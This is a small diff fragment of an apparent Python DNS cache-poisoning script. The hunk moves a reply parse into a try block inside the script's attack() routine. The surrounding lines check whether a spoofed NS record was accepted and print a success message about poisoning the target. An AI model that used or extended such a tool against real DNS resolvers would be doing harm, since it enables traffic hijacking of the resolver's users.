@@ -87,8 +87,8 @@ def attack():
         # check to see if it worked
         sock.sendto(bytes(dns_request), (my_ip, dns_port))
         data = sock.recv(4096)
-        res = DNS(data[2:])
         try:
+            res = DNS(data[2:])
             if res[DNS].ns and res[DNS].ns.rdata == spoof:
                 print "Successfully poisonned our target with a dummy record !!"
                 break
